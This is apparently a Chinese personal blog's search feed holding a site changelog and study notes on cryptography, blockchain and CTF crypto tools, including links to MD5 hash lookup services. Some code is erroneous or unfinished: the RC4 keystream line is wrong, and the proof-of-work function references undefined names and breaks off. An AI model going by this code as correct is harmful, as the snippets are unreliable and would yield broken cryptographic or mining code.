aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h2 id="V1-02-2023-6-7"><a href="#V1-02-2023-6-7" class="headerlink" title="V1.02  [2023-6-7]"></a>V1.02  [2023-6-7]</h2></div></div><div class="timeline-item-content"><div class="tabs" id="v1.02"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#v1.02-1">总体更新</button></li><li class="tab"><button type="button" data-href="#v1.02-2">网站修改【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="v1.02-1"><p>V1.02版本上线，修复了代码块和链接问题，将日志信息移动到关于中。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="v1.02-2"><p>V1.02修改的网站配置如下：</p><ol><li>代码块显示错误问题。</li><li>代码块现在会自动换行。</li><li>修复了链接其他文章网址错误的问题。</li><li>日志信息放在了关于位置，不再在首页显示。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h2 id="V1-0-2023-6-4"><a href="#V1-0-2023-6-4" class="headerlink" title="V1.0  [2023-6-4]"></a>V1.0  [2023-6-4]</h2></div></div><div class="timeline-item-content"><div class="tabs" id="v1.0"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#v1.0-1">总体更新</button></li><li class="tab"><button type="button" data-href="#v1.0-2">修复问题【网站】</button></li><li class="tab"><button type="button" data-href="#v1.0-3">新加配置【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="v1.0-1"><p>V1.0版本上线，修复了文章和网站的错误，美化了一下网站。将网站部署至Github上。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="v1.0-2"><p>V1.0修复的网站问题如下：</p><ol><li>文章的链接和图片错误</li><li>配置了<a href="https://ling71.gitee.io/posts/1518592324.html">mathjax</a>显示数学公式</li><li>修复了页脚时钟和回到顶端百分比的错误</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="v1.0-3"><p>V1.0新加的网站样式如下：</p><ol><li>简介栏颜色</li><li>滚动条属性设置（火狐无效）</li><li>复制和使用F12提示</li><li>按键防抖</li><li><p>图片由API改为固定，图片来源如下：</p><ul><li><p><a href="https://api.yimian.xyz/img?type=moe">https://api.yimian.xyz/img?type=moe</a></p></li><li><p><a href="https://www.dmoe.cc/random.php">https://www.dmoe.cc/random.php</a></p></li><li><p><a href="http://service-ki5kzs0b-1306777571.sh.apigw.tencentcs.com/Mobuv2">http://service-ki5kzs0b-1306777571.sh.apigw.tencentcs.com/Mobuv2</a></p></li><li><p><a href="https://img.paulzzh.tech/touhou/random">https://img.paulzzh.tech/touhou/random</a></p></li><li><p><a href="https://api.ghser.com/random/api.php">https://api.ghser.com/random/api.php</a></p></li><li><p><a href="https://api.ghser.com/random/pc.php">https://api.ghser.com/random/pc.php</a></p></li><li><p><a href="https://api.ghser.com/random/pe.php">https://api.ghser.com/random/pe.php</a></p></li><li><p><a href="https://api.caonm.net/api/dm/index.php">https://api.caonm.net/api/dm/index.php</a></p></li><li><p><a href="https://api.asxe.vip/random.php">https://api.asxe.vip/random.php</a></p></li><li><p><a href="https://api.asxe.vip/scenery.php">https://api.asxe.vip/scenery.php</a></p></li><li><p><a href="https://www.loliapi.com/acg/">https://www.loliapi.com/acg/</a></p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h2 id="V0-9-2023-5-21"><a href="#V0-9-2023-5-21" class="headerlink" title="V0.9  [2023-5-21]"></a>V0.9  [2023-5-21]</h2></div></div><div class="timeline-item-content"><div class="tabs" id="v0.9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#v0.9-1">总体更新</button></li><li class="tab"><button type="button" data-href="#v0.9-2">拓展配置【网站】</button></li><li class="tab"><button type="button" data-href="#v0.9-3">样式配置【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="v0.9-1"><p>V0.9版本制作完成。完成了网站的基础部署，文档部署等。</p><p>配置参考教程：<a href="https://www.fomal.cc/posts/eec9786.html">author::博客魔改教程总结(一) | Fomalhaut🥝</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="v0.9-2"><p>V0.9配置的网站的拓展如下：</p><ol><li>文章双栏显示 </li><li>文章出场动画</li><li>评论信箱</li><li>wowjs动画</li><li>页脚计时器和其他信息</li><li>首页轮播栏</li><li>分类栏</li><li>md外挂标签</li><li>搜索栏</li><li>回到顶部百分比</li><li>来到底部</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="v0.9-3"><p>V0.9配置的网站样式如下：</p><ol><li>主题色</li><li>图片</li><li>一图流背景</li><li>字体</li><li>雪花分割线</li><li>底部选择栏居中</li><li>顶部菜单栏</li><li>夜间霓虹灯</li><li>宇宙星空</li><li>个人卡片渐变色</li><li>页面样式整体更改</li><li>顶栏常驻</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学密码知识</title>
      <link href="/posts/7302411.html"/>
      <url>/posts/7302411.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto密码"><a href="#Crypto密码" class="headerlink" title="Crypto密码"></a>Crypto密码</h1><blockquote><p><a href=".\30ce291f">text::Crypto理论</a></p><p><a href="https://github.com/Magialeaf/Course/tree/main/Crypto">my::部分密码实现</a></p></blockquote><hr><h2 id="一、古典密码"><a href="#一、古典密码" class="headerlink" title="一、古典密码"></a>一、古典密码</h2><h3 id="1-置换加密"><a href="#1-置换加密" class="headerlink" title="1 置换加密"></a>1 置换加密</h3><h4 id="1-1-凯撒"><a href="#1-1-凯撒" class="headerlink" title="1.1 凯撒"></a>1.1 凯撒</h4><h3 id="2-代换加密"><a href="#2-代换加密" class="headerlink" title="2 代换加密"></a>2 代换加密</h3><h4 id="2-1-hill"><a href="#2-1-hill" class="headerlink" title="2.1 hill"></a>2.1 hill</h4><h3 id="3-词频分析"><a href="#3-词频分析" class="headerlink" title="3 词频分析"></a>3 词频分析</h3><blockquote><p><a href="https://quipqiup.com/">词频分析网站</a></p></blockquote><hr><h2 id="二、现代密码"><a href="#二、现代密码" class="headerlink" title="二、现代密码"></a>二、现代密码</h2><h3 id="1-流密码"><a href="#1-流密码" class="headerlink" title="1 流密码"></a>1 流密码</h3><h4 id="1-1-A5算法"><a href="#1-1-A5算法" class="headerlink" title="1.1 A5算法"></a>1.1 A5算法</h4><h4 id="1-2-RC4算法"><a href="#1-2-RC4算法" class="headerlink" title="1.2 RC4算法"></a>1.2 RC4算法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化S</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">0</span> to <span class="number">255</span>:</span><br><span class="line">    S[i] = i</span><br><span class="line">    T[i] = Key[ i % keylen ]</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i =  <span class="number">0</span> to <span class="number">255</span>:</span><br><span class="line">j = (j + S[i] + T[i]) mod <span class="number">256</span></span><br><span class="line">Swap(S[i] , S[j])</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 随机序列生成</span></span><br><span class="line">i,j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i = ( i + <span class="number">1</span>) mod <span class="number">256</span></span><br><span class="line">    j = ( j + S[i] ) mod <span class="number">256</span> </span><br><span class="line">    Swap( S[i] , S[j] )</span><br><span class="line">    t = ( S[i] , S[j] ) mod <span class="number">256</span></span><br><span class="line">    K = S[t]</span><br></pre></td></tr></table></figure><h3 id="2-分组密码"><a href="#2-分组密码" class="headerlink" title="2 分组密码"></a>2 分组密码</h3><h4 id="2-1-DES"><a href="#2-1-DES" class="headerlink" title="2.1 DES"></a>2.1 DES</h4><h4 id="2-2-AES"><a href="#2-2-AES" class="headerlink" title="2.2 AES"></a>2.2 AES</h4><h3 id="3-Hash密码"><a href="#3-Hash密码" class="headerlink" title="3 Hash密码"></a>3 Hash密码</h3><h4 id="3-1-Md5"><a href="#3-1-Md5" class="headerlink" title="3.1 Md5"></a>3.1 Md5</h4><blockquote><p><a href="http://www.paper.edu.cn/scholar/paper/wangxiaoyun-2">md5碰撞</a></p></blockquote><h4 id="3-2-Hash-256"><a href="#3-2-Hash-256" class="headerlink" title="3.2 Hash-256"></a>3.2 Hash-256</h4><blockquote><p><a href="https://zhuanlan.zhihu.com/p/94619052">一文读懂SHA256算法原理及其实现 - 知乎 (zhihu.com)</a></p><p><a href="https://sha256algorithm.com/">Sha256 Algorithm Explained</a></p></blockquote><h3 id="4-公钥密码"><a href="#4-公钥密码" class="headerlink" title="4 公钥密码"></a>4 公钥密码</h3><h4 id="4-1-RSA"><a href="#4-1-RSA" class="headerlink" title="4.1 RSA"></a>4.1 RSA</h4><blockquote><p><a href="https://xz.aliyun.com/t/2446">常见问题</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 质数p q ... 任取（可以不止两个）</span></span><br><span class="line">n = p * q * ...</span><br><span class="line"><span class="comment"># 求欧拉函数</span></span><br><span class="line">φ(n) = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * ...</span><br><span class="line"><span class="comment"># e为公钥，任取小于φ(n)的数</span></span><br><span class="line">gcd(e,φ(n)) = <span class="number">1</span></span><br><span class="line"><span class="comment"># d为私钥</span></span><br><span class="line">d = e^-<span class="number">1</span> mod φ(n)</span><br><span class="line"><span class="comment"># 加密，c = m ** e % n </span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n) </span><br><span class="line"><span class="comment"># 解密，m = c ** d % n</span></span><br><span class="line">m = <span class="built_in">pow</span> (c,d,n)</span><br></pre></td></tr></table></figure><h4 id="4-2-ECC"><a href="#4-2-ECC" class="headerlink" title="4.2 ECC"></a>4.2 ECC</h4><hr><h2 id="三、其他密码"><a href="#三、其他密码" class="headerlink" title="三、其他密码"></a>三、其他密码</h2><blockquote><p><a href="https://www.cnblogs.com/hell0w/p/8254126.html">在线密码工具</a></p></blockquote><h3 id="1-当代编码"><a href="#1-当代编码" class="headerlink" title="1 当代编码"></a>1 当代编码</h3><h4 id="1-1-二战诗歌密码"><a href="#1-1-二战诗歌密码" class="headerlink" title="1.1 二战诗歌密码"></a>1.1 二战诗歌密码</h4><blockquote><p><a href="https://www.cnblogs.com/lingxuer/p/15022287.html">二战诗歌密码加解密</a></p><p>带有关键词的诗歌，如：all，for，die。</p></blockquote><h3 id="2-现代编码"><a href="#2-现代编码" class="headerlink" title="2 现代编码"></a>2 现代编码</h3><h4 id="2-1-rabbit"><a href="#2-1-rabbit" class="headerlink" title="2.1 rabbit"></a>2.1 rabbit</h4><blockquote><p><a href="https://www.sojson.com/encrypt_rabbit.html">rabbit加解密</a></p><p>特点：头为 U2F。</p></blockquote><h4 id="2-2-Ook"><a href="#2-2-Ook" class="headerlink" title="2.2 Ook"></a>2.2 Ook</h4><blockquote><p><a href="https://tool.bugku.com/brainfuck/">Ook加解密</a></p><p>特点：Ook. Ook? Ook!</p></blockquote><h4 id="2-3-阴阳怪气密码"><a href="#2-3-阴阳怪气密码" class="headerlink" title="2.3 阴阳怪气密码"></a>2.3 阴阳怪气密码</h4><blockquote><p><a href="https://mmdjiji.gitee.io/yygq.js/">阴阳怪气密码加解密</a></p><p>特点：不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？</p></blockquote><h4 id="2-4-熊曰佛曰兽语颜文字"><a href="#2-4-熊曰佛曰兽语颜文字" class="headerlink" title="2.4 熊曰佛曰兽语颜文字"></a>2.4 熊曰佛曰兽语颜文字</h4><blockquote><p><a href="http://hi.pcmoe.net/roar.html">熊曰佛曰兽语颜文字加解密</a></p></blockquote><ul><li><strong>熊曰：</strong>呋食動森冬和笨物森嘍嗅嗄呆捕爾噔氏意歡萌麼誒呦沒沒喜取樣沒果肉噔沒麼象眠嗡囑怎爾盜註</li><li><strong>新佛曰：</strong>諸隸僧降吽諸冥陀摩冥隸僧缽薩嚤伏空願哆蜜吶斯祗咒嚤所冥僧冥諸訶塞囉冥吽莊咒</li><li><strong>兽语：</strong>~呜嗷啊呜呜~呜呜嗷啊啊啊啊啊嗷嗷呜啊嗷嗷~</li><li><strong>颜文字：ﾟ</strong>ωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //<em>´∇｀</em>/ [‘<em>‘]; o=(ﾟｰﾟ)  =</em>=    3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^<em>^o)/ (o^</em>^o);(ﾟДﾟ)=</li></ul><h4 id="2-5-垃圾邮件"><a href="#2-5-垃圾邮件" class="headerlink" title="2.5 垃圾邮件"></a>2.5 垃圾邮件</h4><blockquote><p><a href="https://www.spammimic.com/encode.cgi">垃圾邮件加解密</a></p><p>特点：Dear Professional ; Especially for you - this cutting-edge<br>intelligence ! If you no longer wish to receive our<br>publications simply reply with a Subject: of “REMOVE”<br>and you will immediately be removed from our club .<br>This mail is being sent in compliance with Senate bill<br>2216 ; Title 9 ; Section 306 . This is a ligitimate<br>business proposal ! Why work for somebody else when<br>you can become rich inside 99 weeks . Have you ever<br>noticed people love convenience and people love convenience<br>. Well, now is your chance to capitalize on this .<br>WE will help YOU process your orders within seconds<br>and use credit cards on your website ! You are guaranteed<br>to succeed because we take all the risk ! But don’t<br>believe us . Mrs Anderson of Indiana tried us and says<br>“I was skeptical but it worked for me” . We assure<br>you that we operate within all applicable laws . You<br>will blame yourself forever if you don’t order now<br>. Sign up a friend and you’ll get a discount of 10%<br>! Thank-you for your serious consideration of our offer<br>! </p></blockquote><h3 id="3-整活密码"><a href="#3-整活密码" class="headerlink" title="3 整活密码"></a>3 整活密码</h3><ul><li><p>娉娉袅袅十三余,豆蔻梢头二月初</p><blockquote><p>ppnn13%dkstFeb.1st</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链技术</title>
      <link href="/posts/9ad5026b.html"/>
      <url>/posts/9ad5026b.html</url>
      
        <content type="html"><![CDATA[<h1 id="区块链技术"><a href="#区块链技术" class="headerlink" title="区块链技术"></a>区块链技术</h1><blockquote><p><a href="https://blockexplorer.com/">区块链网站</a></p><p><a href="https://blockchaindemo.io/">模拟区块链</a></p></blockquote><hr><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1 基础知识"></a>1 基础知识</h3><ul><li><p>定义</p><blockquote><p>区块链是一种分布式数据库：通过网络连接的节点，每个节点都保存着整个数据库所有数据，任何地点存入的数据都会完成同步。</p><p>一个节点由：数据，自身哈希值，上一节点哈希值组成。</p></blockquote></li><li><p>特点</p><ol><li>分布式网络。</li><li>可建立信任。</li><li>公开透明。</li><li>不可篡改。除非改 51% 的节点。</li></ol></li><li><p>局限性</p><ol><li><p>运行安全风险。</p><blockquote><p><a href="https://blog.csdn.net/triaslab/article/details/85232634">自私挖矿</a></p><p><a href="https://baike.baidu.com/item/双重支付/7046722">双重支付</a></p></blockquote></li><li><p>系统效率及可扩展性问题。</p></li><li><p>隐私泄露风险。</p></li></ol></li><li><p>发展史</p><ol><li>1.0：比特币得到广泛应用。</li><li>2.0：”数字货币“与<a href="https://zhuanlan.zhihu.com/p/413502024">智能合约</a>结合。（智能合约：区块链中的一段自动监督的代码）</li><li>3.0：泛行业去中心化应用。</li></ol></li><li><p>分类</p><ol><li><p>公有链</p><blockquote><p>向公众开放，用户可匿名参与，无需注册，可以在未经授权的情况下访问网络和区块链。</p><p>无法篡改、地吞吐量、交易缓慢。</p></blockquote></li><li><p>联盟链</p><blockquote><p>仅联盟成员参与，链权限由联盟成员制定。因为该链是一种需要注册许可的区块链，所以又叫许可链。</p><p>部分去中心化、可控性较强、数据不会默认公开、交易速度很快。</p></blockquote></li><li><p>私有链</p><blockquote><p>仅私有组织使用，权限组织定，也是许可链。</p><p>速度非常快、隐私保障更好、交易成本低、保证基本产品不易被破坏。</p></blockquote></li><li><p>侧链</p><blockquote><p>能与比特币区块链交互，并与比特币挂钩的区块链。</p><p>因为比特币不易创新和拓展。</p></blockquote></li><li><p>互联链</p><blockquote><p>针对特定领域的应用可以在各自的垂直领域形成区块链。</p></blockquote></li></ol></li></ul><h3 id="2-体系机构"><a href="#2-体系机构" class="headerlink" title="2 体系机构"></a>2 体系机构</h3><ol><li>数据层：存储数据。</li><li>网络层：节点和节点之间信息交换。</li><li>共识层：数据的有效性。</li><li>激励层：激励方法。</li><li>智能合约层：封装了各种脚本、程序和合约。</li><li>应用层：封装了区块链的各种应用和场景。</li></ol><blockquote><p><a href="https://zhuanlan.zhihu.com/p/379921778">结构</a></p><p>底下三层是区块链必须的。（1、2、3）</p></blockquote><h3 id="3-其他关系"><a href="#3-其他关系" class="headerlink" title="3 其他关系"></a>3 其他关系</h3><ul><li><p><strong>大数据</strong></p><blockquote><p>提供如下更好的保障：</p></blockquote><ol><li>数据安全。</li><li>数据开发共享。</li><li>数据存储。</li><li>数据分析。</li><li>数据流通。</li></ol></li><li><p><strong>云计算</strong></p><blockquote><p>IaaS + PaaS + SaaS == BaaS（区块链即服务）</p></blockquote></li></ul><hr><h2 id="二、语言"><a href="#二、语言" class="headerlink" title="二、语言"></a>二、语言</h2><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><h3 id="1-基本模块"><a href="#1-基本模块" class="headerlink" title="1 基本模块"></a>1 基本模块</h3><blockquote><p>hashlib</p><p>datetime</p><p>Struct</p><p>Urllib / requests</p></blockquote><h3 id="2-图形化模块"><a href="#2-图形化模块" class="headerlink" title="2 图形化模块"></a>2 图形化模块</h3><blockquote><p>Tkinter</p><p>PyQT5</p></blockquote><h3 id="3-Web模块"><a href="#3-Web模块" class="headerlink" title="3 Web模块"></a>3 Web模块</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/95942024">WSGI</a></p></blockquote><ul><li>flask：轻量（Werkzeng：WSGI 工具集，jinja2：渲染模块）（WSGI：Web服务器网关结构）</li><li>Django：全能型 Web 框架。</li><li>Web.py：小巧的 Web 框架。</li><li>Bottle：和 Flask 类似的框架。</li><li>Tomado：Facebook 的开源异步 Web 框架。</li></ul><hr><h2 id="三、核心技术"><a href="#三、核心技术" class="headerlink" title="三、核心技术"></a>三、核心技术</h2><blockquote><p><a href=".\7302411">text::Crypto密码</a></p></blockquote><h3 id="1-加密技术"><a href="#1-加密技术" class="headerlink" title="1 加密技术"></a>1 加密技术</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/109554422">数据脱敏</a>    <a href="https://zhuanlan.zhihu.com/p/139114240">差分隐私</a></p><p>HASH-256，ECC，数字签名，数字证书，密钥分存，匿名技术，数据脱敏，差分隐私。</p></blockquote><h3 id="2-核心问题"><a href="#2-核心问题" class="headerlink" title="2 核心问题"></a>2 核心问题</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/155708128">BFT</a>    <a href="https://zhuanlan.zhihu.com/p/335617791">CAP</a>    <a href="https://zhuanlan.zhihu.com/p/548399740">ELP</a></p></blockquote><ul><li><p>一致性问题</p></li><li><p>拜占庭将军问题</p><blockquote><p>问题：存在叛军让通信出错。</p><p>N &gt;= 3F + 1（N：总节点，F：叛军）</p></blockquote></li><li><p>ELP不可能</p><blockquote><p>ELP不可能：在异步网络下，如果有一台机器可能出错，则没有任何确定性共识算法保证在有限时间内结束。</p><p>CAP：一致性，可用性，分区容忍性三个只能同时满足两个。</p></blockquote></li></ul><h3 id="3-共识机制"><a href="#3-共识机制" class="headerlink" title="3 共识机制"></a>3 共识机制</h3><ul><li>PoW机制<blockquote><p>定义<br>优点<br>缺点</p></blockquote></li><li>PoW算法的实现<ol><li>计算出一个”区块头”的hash值，即为当前区块的所有交易信息。</li><li>由于随机数是任意的，因此需要不断更改随机数重新计算hash值。</li><li>当找到一个满足条件的hash值后，将其作为”工作证明”发送给网络上其他结点，其他结点可以轻松验证这个工作量证明是否正确。</li><li>验证无误其他结点会接受这个新区块，这个结点也会被加到区块链上。</li><li>其他结点开始计算下一个区块的hash值。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mine_block</span>(<span class="params">difficulty,block_data</span>):</span><br><span class="line">  start_time = time.time()</span><br><span class="line">  nonce = <span class="number">0</span></span><br><span class="line">  target = <span class="string">&#x27;0&#x27;</span> + difficulty</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 挖矿过程</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data_str = <span class="built_in">str</span>(block_data) +<span class="built_in">str</span>(nonce)</span><br><span class="line">    block_hash = hashlib.sha256(data.<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).hexdigest())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ...</span><br><span class="line">  nonce += <span class="number">1</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure></li></ol></li><li>PoS机制<blockquote><p>定义<br>优点<br>缺点<br>长程攻击，双花。</p></blockquote></li><li><p>PoS算法实现</p><blockquote></blockquote></li><li>DPoS机制<blockquote><p>定义<br>优点<br>缺点</p></blockquote></li><li>分布式一致性算法<blockquote><p>定义</p><ul><li>CFT算法<br>定义<ul><li>Fast Paxos</li><li>Multi-Paxo</li><li>Kafks</li></ul></li><li>BFT算法<br>定义<ul><li>Hot-stuff</li><li>SBFT</li><li>Honey Badger BFT</li></ul></li></ul></blockquote></li><li>共识机制比较</li><li>跨链共识机制</li></ul><hr><h2 id="四、数据存储"><a href="#四、数据存储" class="headerlink" title="四、数据存储"></a>四、数据存储</h2><h3 id="1-哈希指针与区块链"><a href="#1-哈希指针与区块链" class="headerlink" title="1 哈希指针与区块链"></a>1 哈希指针与区块链</h3><ul><li>定义    </li><li>实现</li></ul><h3 id="2-梅克尔树"><a href="#2-梅克尔树" class="headerlink" title="2 梅克尔树"></a>2 梅克尔树</h3><ul><li>定义</li><li>实现</li></ul><h3 id="3-案例"><a href="#3-案例" class="headerlink" title="3 案例"></a>3 案例</h3><ul><li>100%准备金证明</li><li>分布式存储</li></ul><hr><h2 id="五、网络架构"><a href="#五、网络架构" class="headerlink" title="五、网络架构"></a>五、网络架构</h2><h3 id="1-网络架构"><a href="#1-网络架构" class="headerlink" title="1 网络架构"></a>1 网络架构</h3><ul><li><p>节点特点</p><ul><li>存储链或链的一部分。</li><li>连接网络。</li><li><p>参与区块链。</p></li><li><p>节点类型</p><ul><li><p>轻节点</p><blockquote><p>只储存最小量的状态来作为发送或传递交易讯息的节点。</p></blockquote></li><li><p>全节点</p><blockquote><p>验证矿工挖出的块，存储区块链的完整副本。</p></blockquote></li><li><p>普通节点</p><blockquote><p>维护区块链的网络运行。</p></blockquote></li><li><p>矿工节点</p><blockquote><p>产生块。</p></blockquote></li><li><p>超级节点</p><blockquote><p>同时具有全节点和矿工节点的特点。</p></blockquote></li></ul></li></ul></li><li><p>系统类型</p><ul><li>中心化系统</li><li>多中心化系统</li><li><p>去中心化系统</p></li><li><p>网络成员</p><ul><li><p>钱包</p><blockquote><p>比特币交易，信息查询。</p></blockquote></li><li><p>矿工</p><blockquote><p>挖矿领奖。</p></blockquote></li><li><p>完整区块数据存储</p><blockquote><p>整个区块链。</p></blockquote></li><li><p>网络路由</p><blockquote><p>网络维护。</p></blockquote></li></ul></li></ul></li></ul><h3 id="2-比特币网络"><a href="#2-比特币网络" class="headerlink" title="2 比特币网络"></a>2 比特币网络</h3><hr><h2 id="六、以太坊"><a href="#六、以太坊" class="headerlink" title="六、以太坊"></a>六、以太坊</h2><h3 id="1-以太坊技术"><a href="#1-以太坊技术" class="headerlink" title="1 以太坊技术"></a>1 以太坊技术</h3><blockquote><p><a href="https://ethereum.org/zh/">official::以太坊</a></p><p><a href="https://zhuanlan.zhihu.com/p/390884462">以太坊定义</a></p></blockquote><h3 id="2-智能合约"><a href="#2-智能合约" class="headerlink" title="2 智能合约"></a>2 智能合约</h3><h2 id="七、区块链技术改进"><a href="#七、区块链技术改进" class="headerlink" title="七、区块链技术改进"></a>七、区块链技术改进</h2><h3 id="1-增强匿名性"><a href="#1-增强匿名性" class="headerlink" title="1 增强匿名性"></a>1 增强匿名性</h3><blockquote><p>区块链技术最有争议性的一个特性就是匿名性。</p></blockquote><ul><li><p>匿名性分析</p></li><li><p>混币交易</p><p>&gt;</p></li><li><p>零知识证明</p><blockquote><p>证明者能够在不向被证明者提供任何有用信息的情况下，使被证明者相信某个论断是正确的。</p><p>例：邮递员与邮箱。<br>邮递员可以通过将被证明者投入邮箱的信件拿出并给被证明者看，以此证明邮递员有邮箱的密钥。这样就可以向被证明者证明邮递员有密钥同时密钥也没有泄露给被证明者。</p><p><a href="https://zhuanlan.zhihu.com/p/145904278">Zcash</a></p></blockquote></li></ul><h3 id="2-加强去中心化"><a href="#2-加强去中心化" class="headerlink" title="2 加强去中心化"></a>2 加强去中心化</h3><h2 id="八、安全性分析"><a href="#八、安全性分析" class="headerlink" title="八、安全性分析"></a>八、安全性分析</h2><p>1 </p>]]></content>
      
      
      <categories>
          
          <category> 新技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 区块链 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学工具知识</title>
      <link href="/posts/e3bc6d90.html"/>
      <url>/posts/e3bc6d90.html</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto工具"><a href="#Crypto工具" class="headerlink" title="Crypto工具"></a>Crypto工具</h1><hr><h2 id="一、解密工具"><a href="#一、解密工具" class="headerlink" title="一、解密工具"></a>一、解密工具</h2><h3 id="1-CTF工具箱"><a href="#1-CTF工具箱" class="headerlink" title="1 CTF工具箱"></a>1 CTF工具箱</h3><h3 id="2-yafu-1-34"><a href="#2-yafu-1-34" class="headerlink" title="2 yafu-1.34"></a>2 yafu-1.34</h3><blockquote><p>下载：CTF工具箱。</p><p>使用 ： .\yafu-x64 “factor( n )”</p></blockquote><h3 id="3-在线网页"><a href="#3-在线网页" class="headerlink" title="3 在线网页"></a>3 在线网页</h3><ul><li><p>md5破解</p><blockquote><p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p><p><a href="https://pmd5.com/">md5解密 MD5在线解密 破解md5 (pmd5.com)</a></p><p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p></blockquote></li></ul><hr><h2 id="二、Python配置"><a href="#二、Python配置" class="headerlink" title="二、Python配置"></a>二、Python配置</h2><blockquote><p><a href=".\a378bd8e">text::Python</a></p><p><a href="https://www.cnblogs.com/RicL/p/16638528.html">.sage文件</a></p><p><a href="https://pypi.org/">official::Python库</a></p></blockquote><ul><li><p><a href="https://pythonhosted.org/pycrypto/Crypto-module.html">Crypto模块</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="comment"># 随机获得一个(2 ** ( size - 1 )  ~  2 ** ( size )）的质数</span></span><br><span class="line">number.getPrime(size)</span><br><span class="line"><span class="comment"># 求e在fn中的逆元</span></span><br><span class="line">number.inverse(e,fn)</span><br></pre></td></tr></table></figure></li><li><p>libnum模块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串变数字（每个字符变成十六进制，然后组成一个长十六进制，之后转化成十进制）</span></span><br><span class="line">s2n( <span class="built_in">str</span> )</span><br><span class="line"><span class="comment"># 数字变字符串</span></span><br><span class="line">n2s( num )</span><br></pre></td></tr></table></figure></li><li><p><a href="https://geek-docs.com/python/python-os-module/python-os-urandom-method.html">os模块</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成一个大小为size字节的字符串，适合密码学使用，或者我们可以说这个方法生成一个包含随机字符的字符串。</span></span><br><span class="line">urandom(size)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学编码知识</title>
      <link href="/posts/fbb199ac.html"/>
      <url>/posts/fbb199ac.html</url>
      
